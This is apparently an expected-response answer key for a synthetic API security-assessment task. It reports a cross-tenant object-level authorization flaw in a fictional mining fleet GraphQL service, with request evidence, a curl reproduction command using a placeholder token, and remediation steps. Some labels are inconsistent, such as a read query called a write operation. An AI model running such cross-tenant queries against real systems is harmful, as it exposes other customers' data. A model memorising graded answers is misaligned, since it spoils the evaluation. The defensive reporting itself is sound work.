# Expected Response

## System
- **Domain:** Mining / Resource Extraction
- **System:** OreTrack Fleet Management
- **Example ID:** GQL-0225

## Priority Findings

### Finding 1: Mining Fleet — BOLA Write Operation via bulkResourceLookup Exposes Cross-Tenant Fleet Data (Pattern 1.6)
**Severity:** High
**Category:** BOLA / Write Operations Without Ownership Check

**Summary:**
Per §4.0 (RISK-GQL-225): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 1.6 — write operations without ownership check): the `bulkResourceLookup` operation returns fleet data across tenant boundaries when cross-tenant resource IDs are supplied without JWT validation. An attacker from `tenant-7f27` queried `bulkResourceLookup(ids: ["R-2225", "R-1225", "R-3225"])` and received fleet records belonging to `tenant-ed9f`, including `CONFIDENTIAL-7f27ed9f`. In Mining / Resource Extraction, unauthorized access to fleet telemetry, equipment schedules, and operational data enables industrial espionage.

**Evidence from HAR:**
- Request: `POST https://api.oretrack-fleet-manag.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-7f27`
- Query: `bulkResourceLookup(ids: ["R-2225", "R-1225", "R-3225"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-ed9f"`, `ownerId: "other-user-7f27ed9f"`, `sensitiveField: "CONFIDENTIAL-7f27ed9f"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-7f27ed9f`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-225 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.6 | Write operation returns cross-tenant fleet data |
| HAR query | ids: ["R-2225"...] | Cross-tenant mining fleet ID lookup |
| HAR response | tenantId | tenant-ed9f returned to tenant-7f27 |
| HAR response | sensitiveField | CONFIDENTIAL-7f27ed9f |
| HAR header | x-request-id | req-7f27ed9f |

## Steps to Reproduce

### Step 1 — bulkResourceLookup write operation BOLA mining (HAR)
```bash
curl -s -X POST https://api.oretrack-fleet-manag.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-7f27" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2225\", \"R-1225\", \"R-3225\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `tenant-ed9f` mining fleet data including `CONFIDENTIAL-7f27ed9f`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId`.
2. Write/bulk operations must validate per-record `tenantId` against JWT.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
